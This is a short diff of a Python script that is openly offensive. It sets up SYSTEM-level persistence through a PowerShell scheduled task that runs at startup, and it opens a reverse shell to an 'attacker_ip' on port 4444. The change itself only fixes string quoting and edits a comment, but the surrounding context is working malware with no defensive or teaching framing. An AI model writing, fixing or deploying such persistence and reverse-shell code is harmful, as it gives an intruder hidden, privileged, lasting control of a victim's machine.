@@ -10,8 +10,8 @@ def make_persistent():
     python_path = sys.executable  # This gives the path to the currently running Python interpreter
     script_path = os.path.realpath(__file__)  # Get the absolute path of the script
 
-    # PowerShell script to create startup scheduled task
-    powershell_script = f'''
+    # Use raw strings to avoid issues with backslashes in paths
+    powershell_script = rf'''
     $action = New-ScheduledTaskAction -Execute "C:\Users\rubenoltean\AppData\Local\Programs\Python\Python312\python.exe" -Argument "script.py"
     $trigger = New-ScheduledTaskTrigger -AtStartup
     $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
@@ -96,7 +96,7 @@ if __name__ == "__main__":
     print("Running the main part of the script...")
 
     # IP and port for the reverse shell
-    attacker_ip = '10.211.55.24'  # IP
+    attacker_ip = '10.211.55.24'  # Replace with actual IP
     attacker_port = 4444  # Port for the reverse shell
 
     reverse_shell(attacker_ip, attacker_port)
